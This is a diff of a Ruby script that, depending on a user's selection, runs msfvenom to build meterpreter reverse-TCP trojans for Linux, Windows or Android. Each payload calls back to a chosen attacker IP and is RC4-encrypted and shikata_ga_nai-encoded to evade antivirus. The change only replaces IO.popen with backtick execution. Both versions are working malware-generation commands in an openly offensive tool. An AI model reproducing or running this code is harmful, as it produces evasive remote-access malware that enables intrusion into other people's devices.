@@ -29,19 +29,13 @@ fileName = nil
 case selection
 when "LINUX"
   fileName = "trojan.elf"
-  IO.popen "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=#{ip} --encrypt rc4 --encrypt-key #{key} -e x86/shikata_ga_nai -i 5 -f elf -o #{fileName}" do |io|
-    puts io.gets
-  end
+  puts `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=#{ip} --encrypt rc4 --encrypt-key #{key} -e x86/shikata_ga_nai -i 5 -f elf -o #{fileName}`
 when "WINDOWS"
   fileName = "trojan.exe"
-  IO.popen "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=#{ip} --encrypt rc4 --encrypt-key #{key} -e x86/shikata_ga_nai -i 5 -f exe -o #{fileName}" do |io|
-    puts io.gets
-  end
+  puts `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=#{ip} --encrypt rc4 --encrypt-key #{key} -e x86/shikata_ga_nai -i 5 -f exe -o #{fileName}`
 when "ANDROID"
   fileName = "trojan.apk"
-  IO.popen "msfvenom -p android/meterpreter/reverse_tcp LHOST=#{ip} --encrypt rc4 --encrypt-key #{key} -e x86/shikata_ga_nai -i 5 -f raw -o #{fileName}" do |io|
-    puts io.gets
-  end
+  puts `msfvenom -p android/meterpreter/reverse_tcp LHOST=#{ip} --encrypt rc4 --encrypt-key #{key} -e x86/shikata_ga_nai -i 5 -f raw -o #{fileName}`
 else
   # exit if the user entered an invalid selection
   puts "Invalid selection"
